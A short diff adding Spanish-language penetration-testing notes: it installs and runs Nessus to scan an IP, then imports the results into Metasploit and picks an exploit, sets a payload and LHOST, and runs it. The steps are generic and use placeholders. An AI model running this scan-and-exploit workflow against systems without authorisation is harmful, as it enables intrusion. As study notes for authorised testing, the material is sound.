@@ -1,0 +1,28 @@
+++ dpkg -i <nombre_paquete_nessus>
+
+++ systemctl start nessud.service
+
+++ systemctl status nessud.service
+
+++ Ir al navegador web e ingresar: 127.0.0.1:8834
+--- New Scan
+--- Colocar ip a escanear
+--- Start Scan
+--- Export 
+
+++ msfconsole 
+--- db_import <archivo_nessus_exportado>
+--- Enter
+--- hosts ---> Muestra la ip del host asociado al archivo nessus
+--- services ---> Muestra los servicios asociados archivo nessus
+--- vulns ---> Muestra las vulnerabilidades asociadas archivo nessus
+--- analyze ---> Analiza en busca de la vulnerabilidades asociadas al archivo nessus
+--- use <exploit_encontrado>
+--- show options
+--- show payloads
+--- set payload <nombre_payload>
+--- set LHOST <ip_local>
+--- exploit
+
+
+
